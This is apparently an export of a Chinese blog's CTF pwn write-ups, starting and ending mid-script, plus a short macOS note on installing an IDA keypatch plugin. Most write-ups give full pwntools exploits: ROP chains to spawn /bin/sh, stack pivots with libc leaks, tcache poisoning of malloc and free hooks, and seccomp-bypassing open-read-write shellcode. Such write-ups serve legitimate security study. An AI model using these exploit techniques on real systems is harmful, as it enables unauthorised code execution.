0x601198 --&gt; 0x26c46b053d3e2f00 RSP: 0x7ffefee5e350 --&gt; 0x7ffefee5e440 --&gt; 0x1 RIP: 0x4008de (mov rdx,QWORD PTR [rbp-0x8]) R8 : 0x7f0bb0977700 (0x00007f0bb0977700) R9 : 0x12 R10: 0x78 ('x') R11: 0x246 R12: 0x400680 (xor ebp,ebp) R13: 0x7ffefee5e440 --&gt; 0x1 R14: 0x0 R15: 0x0 EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] 0x4008cf: mov eax,0x0 0x4008d4: call 0x4007de 0x4008d9: mov eax,0x0 =&gt; 0x4008de: mov rdx,QWORD PTR [rbp-0x8] 0x4008e2: xor rdx,QWORD PTR fs:0x28 0x4008eb: je 0x4008f2 0x4008ed: call 0x400600 &lt;__stack_chk_fail@plt&gt; 看这里，在取数值时，其在你迁移的bss段读取数值到rdx进行判断的，所以在第一次往bss段读的时候，填充好canary的值。 并且这个题，在看got表到bss段的距离也是很近的。 所以在迁移的时候需要注意，从有实际意义的函数（比如puts）开始前就得把栈抬高。否则在进入libc的内部调用函数时，会因为各种push pop 而修改到got处的东西，导致不仅泄漏的数值有问题，并且容易让程序崩掉。 payload = p64(canary)*(0x100/8)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(pop_rdi)+p64(0) s.sendafter(\"canary ' s 5 0 n g :\",payload) payload = p64(canary)*6+p64(bss+0x100-8) s.sendafter(\"canary ' s h 0 m e :\",payload) s.recvline() puts = u64(s.recv(6).ljust(8,'\\x00')) success(hex(puts)) s.recvline() 此处就可以泄漏出puts函数的libc地址，但是由于出题人想考察ret2dl_runtime_resolve,所以应该是魔改了libc。 然后可以使用DynELF来搞定，参考群里师傅分享的exp。 Dynelf函数怎么写由于程序只有puts函数来输出，就用puts函数来进行泄漏。 payload = p64(0) * 57 +p64(canary) * 2 +p64(pop_rdi)+p64(address)+p64(puts_plt)+ p64(start_addr) 本来我是这样写的，但是发现程序还是会崩，由于程序情况的限制，栈只能提高0x1b0这样，还是不够用。 还是就想办法提升栈，往高点的bss上写入rop进行想要的操作。 这个就在Dynelf前写好,用rop控制参数，调用read函数来往高点的bss段进行写payload，并且最后用pop rsp的操作，把写好rop chain的bss的地址pop 到rsp上，然后再ret上去： payload = p64(canary)*(0x100/8)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(pop_rdi)+p64(0) payload += p64(pop_rsi_r15)+p64(bss+0x500)+p64(0)+p64(read_plt)+p64(pop_rsp_3)+p64(bss+0x500-8*3)+\"/bin/sh\\x00\" s.sendafter(\"canary ' s 5 0 n g :\",payload) payload = p64(canary)*6+p64(bss+0x100-8) s.sendafter(\"canary ' s h 0 m e :\",payload) s.recvline() 接着就是用这写好好的rop chain，进行泄漏地址，为了Dynelf多次调用泄漏，在泄漏地址后，跟上read函数继续往这段地址上读取同样的rop chain，然后再次控制rsp，接着ret到对应的位置： def vuln(address): payload = p64(pop_rdi)+p64(address)+p64(puts_plt)+p64(pop_rdi)+p64(0) payload += p64(pop_rsi_r15)+p64(bss+0x500)+p64(0) + \\ p64(read_plt)+p64(pop_rsp_3)+p64(0x6015a0-8*3) s.recvline(timeout=0.07) s.send(payload) count = 0 up = \"\" buf = '' while True: c = s.recv(numb=1, timeout=0.07) count += 1 if up == '\\n' and c == \"\": buf = buf[:-1] buf += \"\\x00\" break else: buf += c up = c data = buf[:8] log.debug(\"%#x =&gt; %s\" % (address, (data or '').encode('hex'))) return data 可以看到是提高了0x500个字节的地方进行rop，做好用控制rsp，ret后进行反复横跳跃，完成对system 的寻找。感觉这是很好的办法，因为栈迁移的核心还是控制rsp，最初学习是见过2次栈迁移的题目，当时用的还是leave ret 来进行的控制，现在看到直接使用pop rsp 来控制，的确是方便又简单的办法。 expfrom pwn import * # from LibcSearcher import * s = process(\"./pwn\") # s = remote(\"183.129.189.61\",54900) libc = ELF(\"/lib/x86_64-linux-gnu/libc-2.23.so\") elf = ELF(\"./pwn\") context.log_level='debug' def debug(): # gdb.attach(proc.pidof(s)[0],gdbscript='b main') gdb.attach(s) pause() pop_rdi = 0x0000000000400963 pop_rsi_r15 = 0x0000000000400961 pop_rsp_3 = 0x000000000040095d leave_ret = 0x00000000004007dc context.terminal = ['tmux','neww'] puts_plt = elf.plt['puts'] puts_got = elf.got['puts'] read_plt = elf.plt['read'] bss = 0x6010a0 s.sendafter(\"canary ' s @ # $ % ^ &amp; * :\\n\", \"%9$p\") canary = int(s.recvline(keepends=False), 16) success(hex(canary)) context.arch = 'amd64' def vuln(address): payload = p64(pop_rdi)+p64(address)+p64(puts_plt)+p64(pop_rdi)+p64(0) payload += p64(pop_rsi_r15)+p64(bss+0x500)+p64(0) + \\ p64(read_plt)+p64(pop_rsp_3)+p64(0x6015a0-8*3) s.recvline(timeout=0.07) s.send(payload) count = 0 up = \"\" buf = '' while True: c = s.recv(numb=1, timeout=0.07) count += 1 if up == '\\n' and c == \"\": buf = buf[:-1] buf += \"\\x00\" break else: buf += c up = c data = buf[:8] log.debug(\"%#x =&gt; %s\" % (address, (data or '').encode('hex'))) return data debug() payload = p64(canary)*(0x100/8)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(pop_rdi)+p64(0) payload += p64(pop_rsi_r15)+p64(bss+0x500)+p64(0)+p64(read_plt)+p64(pop_rsp_3)+p64(bss+0x500-8*3)+\"/bin/sh\\x00\" s.sendafter(\"canary ' s 5 0 n g :\",payload) payload = p64(canary)*6+p64(bss+0x100-8) s.sendafter(\"canary ' s h 0 m e :\",payload) s.recvline() puts = u64(s.recv(6).ljust(8,'\\x00')) success(hex(puts)) s.recvline() d = DynELF(vuln,elf=elf) system = d.lookup('system','libc') success(hex(system)) payload = p64(pop_rdi)+p64(0x6010a0+0x100+8*11)+p64(system) s.send(payload) s.interactive()","categories":[],"tags":[{"name":"re","slug":"re","permalink":"http://chumen77.xyz/tags/re/"},{"name":"pwn","slug":"pwn","permalink":"http://chumen77.xyz/tags/pwn/"},{"name":"IOT","slug":"IOT","permalink":"http://chumen77.xyz/tags/IOT/"}]},{"title":"MacOS安装IDA插件keypatch","slug":"MacOS安装IDA插件keypatch","date":"2020-08-10T09:23:15.104Z","updated":"2020-08-10T15:11:27.782Z","comments":true,"path":"2020/08/10/MacOS安装IDA插件keypatch/","link":"","permalink":"http://chumen77.xyz/2020/08/10/MacOS安装IDA插件keypatch/","excerpt":"","text":"MacOS安装IDA插件keypatchmacOS 安装官方介绍的安装方式不太行。网上参考后记录一下。 cmakebrew install cmake gitgit clone https://github.com/fjh658/keystone-engine.git cd keystone-engine git submodule update --init --recursive sudo python2 setup.py install --verbose 此时在安装后的最后几段代码中，找到类似： /Library/Python/2.7/site-packages/keystone 这是本地python2.7的路径。 cpcp -r /Library/Python/2.7/site-packages/keystone /Applications/IDA\\ Pro\\ 7.0/ida.app/Contents/MacOS/python/lib/python2.7/lib-dynload/ sudo curl -L https://raw.githubusercontent.com/keystone-engine/keypatch/master/keypatch.py &gt; keypatch.py 现实拒绝的话，可以 vim /etc/hosts 199.232.68.133 raw.githubusercontent.com cp -r ./keypatch.py /Applications/IDA\\ Pro\\ 7.0/ida64.app/Contents/MacOS/plugins/ cp -r ./keypatch.py /Applications/IDA\\ Pro\\ 7.0/ida.app/Contents/MacOS/plugins/ 然后进入ida使用即可。","categories":[],"tags":[{"name":"杂项","slug":"杂项","permalink":"http://chumen77.xyz/tags/杂项/"}]},{"title":"DASCTF安恒月赛(7th)","slug":"DASCTF安恒月赛(7th)","date":"2020-07-25T13:50:36.163Z","updated":"2020-08-10T03:50:16.610Z","comments":true,"path":"2020/07/25/DASCTF安恒月赛(7th)/","link":"","permalink":"http://chumen77.xyz/2020/07/25/DASCTF安恒月赛(7th)/","excerpt":"","text":"DASCTF安恒月赛(7th)只做出个签到题，tcl。。。 虚假的签到题简单的栈溢出，但是出题人估计是用了GCC&gt;=4.9版本，故意给这个Stack Buffer Overflow 设置难度。 分析0x80485fd &lt;main+104&gt;: mov ecx,DWORD PTR [ebp-0x4] 0x8048600 &lt;main+107&gt;: leave 0x8048601 &lt;main+108&gt;: lea esp,[ecx-0x4] 0x8048604 &lt;main+111&gt;: ret 这里我们可以看到，程序在对栈的保存上，额外使用了 ecx 来保存栈上的某个值。并且调试可以发现，如果我们直接overflow了 esp，那么会造成奇怪的影响。 试着分析一下： 想要控制esp，就得控制ecx 想要控制ecx，就得至少控制到ebp-0x4的位置 由于是gets的获取输入，这个明显很容易实现。 核心就是让： [ [ebp-0x4] - 0x4] = address(backdoor) 附上成功时栈情况,断点在0x80485fd ： 由于栈随机化，其中需要用格式化字符串漏洞泄漏[ebp-0x4]，来获取在ebp-0x4的位置填入什么值合适，从而完成攻击。 expfrom pwn import * import time local_file = './qiandao' local_libc = '/lib/x86_64-linux-gnu/libc.so.6' remote_libc = local_libc # './libc.so.6' context.log_level = 'debug' debug = 0 if debug: io = process(local_file) libc = ELF(local_libc) else: io = remote('183.129.189.60',10013) libc = ELF(remote_libc) elf = ELF(local_file) context.arch = elf.arch context.terminal = ['tmux','neww'] s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() one = 0x804857D # debug() payload = '%13$p' sla('name',payload) ru('0x') key = int(r(8),16) - 0x40 + 0x8 info_addr('key',key) payload = p32(one)*9 + p32(key) sla(\"?\",payload) itr() 多调试，会更容易理解。","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://chumen77.xyz/tags/pwn/"}]},{"title":"BUUCTF暑假刷题(1)","slug":"BUUCTF暑假刷题","date":"2020-07-10T13:16:13.644Z","updated":"2020-10-10T12:21:34.242Z","comments":true,"path":"2020/07/10/BUUCTF暑假刷题/","link":"","permalink":"http://chumen77.xyz/2020/07/10/BUUCTF暑假刷题/","excerpt":"","text":"BUUCTF暑假刷题(1)cmcc_simplerop分析静态链接。32位程序。用int 80h 这个中断调用，呼叫系统调用程序system_call().。 然后rop 控制EAX = 0Xb = 11，EBX = &amp;(“/bin/sh”), ECX = EDX = 0，即执行了sys_execve(&quot;/bin/sh&quot;, 0, 0, 0)，即可拿到shell。 32位系统调用表：https://blog.csdn.net/xiaominthere/article/details/17287965 expfrom pwn import * import time local_file = './simplerop' local_libc = '/lib/x86_64-linux-gnu/libc.so.6' remote_libc = local_libc # '../libc.so.6 context.log_level = 'debug' debug = 0 if debug: io = process(local_file) libc = ELF(local_libc) else: io = remote('node3.buuoj.cn',29124) libc = ELF(remote_libc) elf = ELF(local_file) libc = elf.libc context.arch = elf.arch context.terminal = ['tmux','neww'] rce16 = [0x45216,0x4526a,0xf02a4,0xf1147] realloc = [0x2,0x4,0x6,0xB,0xC,0xD] arae18 = 0x3ebca0 s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) sea = lambda delim,data :io.sendafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() offset = 32 start = 0x8048E45 read = 0x806CD50 pop_eax_ret = 0x080bae06 pop_ebx_ret = 0x080481c9 pop_ecx_ebx_ret = 0x0806e851 pop_edx_ret = 0x0806e82a pop3_ret = 0x08048913 bss = 0x80EC2EC - 0x10 ret = 0x8048E6F in_t_0x80 = 0x080493e1 payload = 'a' * offset + flat([read,pop3_ret,0,bss,0x8]) payload += flat([pop_eax_ret,11,pop_ecx_ebx_ret,0,bss,pop_edx_ret,0,in_t_0x80]) sa(':',payload) s('/bin/sh\\x00') itr() 其中rop链read后返回地址：pop3_ret，是为了pop 0,bss,0x8，然后再跟着rop。 ciscn_2019_n_3分析Ubuntu 18 ,存在UAF漏洞。 int __cdecl rec_str_free(void *ptr) &#123; free(*((void **)ptr + 2)); free(ptr); return puts(\"Note freed!\"); &#125; 每创建一个堆，就有一个0x10的堆空间，存放函数指针。一看到这个，就可以说是暗示攻击这个地方来劫持程序流程。 int do_del() &#123; int v0; // eax v0 = ask((int)\"Index\"); return (*(int (__cdecl **)(int))(records[v0] + 4))(records[v0]); &#125; 利用这个函数来劫持程序流程。先new(0,2,0x40,payload)看一下程序的内存情况, 对于其中的(*(int (__cdecl **)(int))(records[v0] + 4))(records[v0]) ： gef➤ p &amp;records $1 = (&lt;data variable, no debug info&gt; *) 0x804b080 &lt;records&gt; gef➤ x/wx 0x804b080 0x804b080 &lt;records&gt;: 0x08635160 gef➤ x/wx 0x08635160 0x8635160: 0x080486de 所以 records[v0] = 0x08635160 gef➤ x/wx 0x08635160+4 0x8635164: 0x08048725 gef➤ x/i 0x08048725 0x8048725 &lt;rec_str_free&gt;: push ebp 所以 *(int (__cdecl **)(int))(records[v0] + 4)) = 0x8048725 &lt;rec_str_free&gt;: 且如图，把这里的函数指针控制成sh\\x00\\00 + &amp;system ,即执行do_del时，运行的就是system(sh)可拿到shell。 expfrom pwn import * import time local_file = './ciscn_2019_n_3' local_libc = '/lib/x86_64-linux-gnu/libc.so.6' remote_libc = local_libc # '../libc.so.6 context.log_level = 'debug' debug = 0 if debug: io = process(local_file) libc = ELF(local_libc) else: io = remote('node3.buuoj.cn',26453) libc = ELF(remote_libc) elf = ELF(local_file) libc = elf.libc context.arch = elf.arch context.terminal = ['tmux','neww'] rce16 = [0x45216,0x4526a,0xf02a4,0xf1147] realloc = [0x2,0x4,0x6,0xB,0xC,0xD] arae18 = 0x3ebca0 s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) sea = lambda delim,data :io.sendafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() def new(id,type,len,context): sla(\"CNote &gt;\",'1') sla(\"dex &gt;\",str(id)) sla(\"Type &gt;\",str(type)) sla(\"th &gt;\",str(len)) sa(\"ue &gt;\",str(context)) def free(id): sla(\"CNote &gt;\",'2') sla(\"dex &gt;\",str(id)) def show(id): sla(\"CNote &gt;\",'3') sla(\"dex &gt;\",str(id)) payload = \"a\" + '\\n' new(0,2,0x40,payload) new(1,2,0x40,payload) free(1) free(0) system = elf.plt['system'] new(2,2,0x9,'sh\\x00\\x00'+ p32(system)) free(1) itr() 无system函数情况下Leak libc，还是攻击那一个函数指针，本地通远程没通。 在测试的时候，由于fgets总是在你传入的字符串后加上\\x00，曾经就遇到过，导致泄漏十分难进行，但是发现： payload = '' new(2,2,0x0,payload) ru(\"lue=\") libc_base = uu32(r(4)) - 0x1d89d8 传入空字节竟然可以通过，且没有加上\\x00，从而不影响泄漏libc。还不知道是否以后遇到fgets函数就可以这样处理其影响，先挖个坑，记录着。 payload = 'a' + '\\n' new(0,2,0x400,payload) new(1,2,0x400,payload) free(0) payload = '' new(2,2,0x0,payload) ru(\"lue=\") libc_base = uu32(r(4)) - 0x1d89d8 info_addr(\"libc_base\",libc_base) payload = '\\x00'*4 + '/bin/sh\\x00' +'\\n' new(3,2,0x400-0x10-0x10,payload) new(4,2,0x40,payload) new(5,2,0x40,payload) free(5) free(4) rec = libc_base + 0x3d123 new(6,2,0x9,p32(rec) + p32(rec)) # free(5) show(5) # debug() itr() V&amp;N2020easyTHeap分析Ubuntu 18 ,存在UAF漏洞，tcache dup攻击。 考点： 攻击tcache_perthread_struct，伪造tcache已经满了 攻击tcache_entry，在指定的位置写上目标地址，在申请一个对应大小的堆，即可实现任意地址写入。exp from pwn import * import time local_file = './vn_pwn_easyTHeap' local_libc = '/lib/x86_64-linux-gnu/libc-2.27.so' remote_libc = './libc-2.27.so' context.log_level = 'debug' debug = 1 if debug: io = process(local_file) libc = ELF(local_libc) else: io = remote('node3.buuoj.cn',25814) libc = ELF(remote_libc) elf = ELF(local_file) # libc = elf.libc context.arch = elf.arch context.terminal = ['tmux','neww'] rce16 = [0x45216,0x4526a,0xf02a4,0xf1147] realloc = [0x2,0x4,0x6,0xB,0xC,0xD] arae18 = 0x3ebca0 s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) sea = lambda delim,data :io.sendafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() def add(size): sla(\"choice\",'1') sla(\"?\",str(size)) def edit(idx,context): sla(\"choice\",'2') sla('idx',str(idx)) sa('content',str(context)) def show(idx): sla('choice','3') sla('idx',str(idx)) def free(idx): sla('choice','4') sla(\"idx\",str(idx)) add(0x100) #0 add(0x100) #1 free(0) free(0) show(0) r() heapbase = uu64(r(6)) - 0x260 info_addr('heapbase',heapbase) add(0x100) #2 edit(2,p64(heapbase+0x10)) add(0x100) #3 add(0x100) #4 edit(4,'\\x07'*0x10) free(0) show(0) r() libc_base = uu64(r(6)) - 0x3ebca0 info_addr('libc_base',libc_base) __malloc_hook = libc_base + 0x3ebc30 __realloc_hook = __malloc_hook -0x8 payload = '\\x00' * (8+7) + '\\x01' + '\\x00' * (0x80 - 8 - 8) + '\\x00' * 0x38 + p64(__realloc_hook) edit(4,payload) add(0x100) #5 onerec = 0x10a38c + libc_base realloc_addr = libc_base + libc.symbols['__libc_realloc'] info_addr('relloc',realloc_addr) info_addr('__malloc_hook',__malloc_hook) payload = p64(onerec) + p64(realloc_addr+8) edit(5,payload) add(0x100) #debug() itr() ciscn_2019_final_3分析Ubuntu 18，保护全开，存在uaf漏洞。 程序只有增加和删除的功能，但是增加一个堆块后回给你返回申请堆块的地址信息。 printf(\"gift :%p\\n\", heaplist[HIDWORD(size)]); 删除堆后，没有置0的操作，存在uaf。 考点： 攻击tcache_perthread_struct，伪造tcache已经满了 攻击tcache_entry，在指定的位置写上目标地址，在申请一个对应大小的堆，即可实现任意地址写入。 难点： 泄漏libc地址 精巧的构造一个任意地址写（在tcache struct处折腾） expfrom pwn import * import time local_file = './ciscn_final_3' local_libc = '/lib/x86_64-linux-gnu/libc.so.6' remote_libc = local_libc # './libc.so.6' context.log_level = 'debug' debug = 1 if debug: io = process(local_file) libc = ELF(local_libc) else: io = remote('node3.buuoj.cn',27714) libc = ELF(remote_libc) elf = ELF(local_file) context.arch = elf.arch context.terminal = ['tmux','neww'] rce16 = [0x45216,0x4526a,0xf02a4,0xf1147] rce18 = [] realloc = [0x2,0x4,0x6,0xB,0xC,0xD] arae18 = 0x3ebca0 s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) sea = lambda delim,data :io.sendafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() def add(idx,size,content): sla(\"&gt;\",'1') sla('index',str(idx)) sla('size',str(size)) sa('thing',str(content)) ru(\"0x\") gift = int(r(12),16) info_addr('gift',gift) return gift def free(idx): sla(\"&gt;\",'2') sla(\"index\",str(idx)) heap_base = add(0,0x48,'a') - 0x11e70 free(0) free(0) add(1,0x48,p64(heap_base+0x10)) add(2,0x48,p64(heap_base+0x10)) payload = 0x30 * '\\x07' add(3,0x48,payload) free(3) payload = 0x30 * '\\x00' add(4,0x48,payload) add(5,0x10,' ') libc_base = add(6,0x78,' ') - 0x3ebca0 info_addr('libc_base',libc_base) free_hook = libc_base + 0x3ed8e8 free(5) add(7,0x10,p64(free_hook)*2) one_rec = 0x4f322 + libc_base add(8,0x48,p64(one_rec)) # debug() free(4) itr() 调试一下就懂了。其中0x10那个堆块的申请很重要，正好可以供后面的使用。 picoctf_2018_rop chain分析只是一个简单的rop，考的就是32位下如何控制传参数。 expfrom pwn import * import time local_file = './PicoCTF_2018_rop_chain' local_libc = '/lib/x86_64-linux-gnu/libc.so.6' remote_libc = local_libc # './libc.so.6' context.log_level = 'debug' debug = 0 if debug: io = process(local_file) libc = ELF(local_libc) else: io = remote('node3.buuoj.cn',29550) libc = ELF(remote_libc) elf = ELF(local_file) context.arch = elf.arch context.terminal = ['tmux','neww'] #,''splitw','-h' rce16 = [0x45216,0x4526a,0xf02a4,0xf1147] rce18 = [] realloc = [0x2,0x4,0x6,0xB,0xC,0xD] arae18 = 0x3ebca0 s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() win_function1 = 0x080485CB win_function2 = 0x80485D8 flag = 0x0804862B offset = 0x18 + 4 ru('Enter your input&gt;') payload = 'a' * offset + flat([win_function1,win_function2,flag,0xBAAAAAAD,0xDEADBAAD]) # debug() s(payload + '\\n') itr() pwnable_orw分析考点 ： 简单shellcode 的编写 seccomp（挖坑） https://veritas501.space/2018/05/05/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/ https://blog.betamao.me/2019/01/23/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bseccomp/ 先用seccomp-tools看下禁用了什么函数： ➜ pwnable_orw seccomp-tools dump ./orw line CODE JT JF K ================================= 0000: 0x20 0x00 0x00 0x00000004 A = arch 0001: 0x15 0x00 0x09 0x40000003 if (A != ARCH_I386) goto 0011 0002: 0x20 0x00 0x00 0x00000000 A = sys_number 0003: 0x15 0x07 0x00 0x000000ad if (A == rt_sigreturn) goto 0011 0004: 0x15 0x06 0x00 0x00000077 if (A == sigreturn) goto 0011 0005: 0x15 0x05 0x00 0x000000fc if (A == exit_group) goto 0011 0006: 0x15 0x04 0x00 0x00000001 if (A == exit) goto 0011 0007: 0x15 0x03 0x00 0x00000005 if (A == open) goto 0011 0008: 0x15 0x02 0x00 0x00000003 if (A == read) goto 0011 0009: 0x15 0x01 0x00 0x00000004 if (A == write) goto 0011 0010: 0x06 0x00 0x00 0x00050026 return ERRNO(38) 0011: 0x06 0x00 0x00 0x7fff0000 return ALLOW 明显只能执行 open read wirte 函数。 #这里可以用pwntools库的一个函数代替,shellcraft c语言:open(\"/home/orw/flag\") &lt;==&gt; 汇编:asm(shellcraft.open(\"/home/orw/flag\")) c语言:read(3,buf,0x20)&lt;==&gt; 汇编:asm(shellcraft.read(3,\"esp\",0x20) c语言:write(1,buf,0x20)&lt;==&gt;汇编:asm(shellcraft.write(1,\"esp\",0x20)) 其中 就是以esp当做临时变量 buf的地址，其可以自定义。 其中open函数执行后，由于是打开了一个新的文件，其返回的fd就是3，所以后面跟着的read的文件描述符也为3。 expfrom pwn import * import time local_file = './orw' local_libc = '/lib/x86_64-linux-gnu/libc.so.6' remote_libc = local_libc # './libc.so.6' context.log_level = 'debug' debug = 0 if debug: io = process(local_file) libc = ELF(local_libc) else: io = remote('node3.buuoj.cn',26224) libc = ELF(remote_libc) elf = ELF(local_file) context.arch = elf.arch context.terminal = ['tmux','neww'] #,''splitw','-h' rce16 = [0x45216,0x4526a,0xf02a4,0xf1147] rce18 = [] realloc = [0x2,0x4,0x6,0xB,0xC,0xD] arae18 = 0x3ebca0 s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() bss = 0x804A128 - 0x30 payload= asm(shellcraft.open(\"./flag\")) payload += asm(shellcraft.read(3,bss,0x30)) payload += asm(shellcraft.write(1,bss,0x30)) sl(payload) itr() V&amp;N2020 公开赛warmup分析开启了沙盒，使用orw获取flag即可。 Here is my gift: 0x7f411f85c9c0 line CODE JT JF K ================================= 0000: 0x20 0x00 0x00 0x00000004 A = arch 0001: 0x15 0x00 0x09 0xc000003e if (A != ARCH_X86_64) goto 0011 0002: 0x20 0x00 0x00 0x00000000 A = sys_number 0003: 0x35 0x07 0x00 0x40000000 if (A &gt;= 0x40000000) goto 0011 0004: 0x15 0x06 0x00 0x0000003b if (A == execve) goto 0011 0005: 0x15 0x00 0x04 0x00000001 if (A != write) goto 0010 0006: 0x20 0x00 0x00 0x00000024 A = count &gt;&gt; 32 # write(fd, buf, count) 0007: 0x15 0x00 0x02 0x00000000 if (A != 0x0) goto 0010 0008: 0x20 0x00 0x00 0x00000020 A = count # write(fd, buf, count) 0009: 0x15 0x01 0x00 0x00000010 if (A == 0x10) goto 0011 0010: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0011: 0x06 0x00 0x00 0x00000000 return KILL 其中，这题因为只有0x10的溢出空间，猛的一看需要栈迁移，但是会发现不知道往哪里迁移。看了师傅们的博客才知道，由于第一个栈空间较大，且与第二个可以溢出的栈是紧邻的。然后，就可以在溢出时覆盖一下返回地址，覆盖为ret，这样就可以多一个ret，从而接着执行上一个栈帧buf里面构造的rop链。 并且在orw中，open函数的第一个参数时一个指针地址(*filename)，所以需要先read一下flag的文件名到一个buf当中，然后再进行orw。 Buf的寻找：在libc中找一个没有用到的地址段即可。比如__free_hook expfrom pwn import * import time local_file = './vn_pwn_warmup' local_libc = '/lib/x86_64-linux-gnu/libc.so.6' remote_libc = local_libc # './libc.so.6' context.log_level = 'debug' debug = 0 if debug: io = process(local_file) libc = ELF(local_libc) else: io = remote('node3.buuoj.cn',27585) libc = ELF(remote_libc) elf = ELF(local_file) context.arch = elf.arch context.terminal = ['tmux','neww'] s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() ru('0x') libc_base = int(r(12),16) - libc.sym['puts'] info_addr('libc_base',libc_base) pop_rdi = 0x0000000000021102 + libc_base pop_rsi = 0x00000000000202e8 + libc_base pop_rdx = 0x0000000000001b92 + libc_base open = libc_base+libc.sym['open'] read = libc_base+libc.sym['read'] puts = libc_base+libc.sym['puts'] buf = libc_base+libc.sym['__free_hook'] payload = flat([ pop_rdi,0,pop_rsi,buf,pop_rdx,8,read, pop_rdi,buf,pop_rsi,0,pop_rdx,0,open, pop_rdi,3,pop_rsi,buf,pop_rdx,0x30,read, pop_rdi,buf,puts ]) sa(':',payload) # debug() ret = libc_base + 0x0000000000000937 payload = 'a' * 0x78 + p64(ret) sa('?',payload) sleep(1) # debug() s('./flag\\x00\\x00') itr() picoctf_2018_buffer overflow 1简单的栈溢出，且存在后门。 expfrom pwn import * import time local_file = './PicoCTF_2018_buffer_overflow_1' local_libc = '/lib/x86_64-linux-gnu/libc.so.6' remote_libc = local_libc # './libc.so.6' context.log_level = 'debug' debug = 0 if debug: io = process(local_file) libc = ELF(local_libc) else: io = remote('node3.buuoj.cn',29988) libc = ELF(remote_libc) elf = ELF(local_file) context.arch = elf.arch context.terminal = ['tmux','neww'] s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda 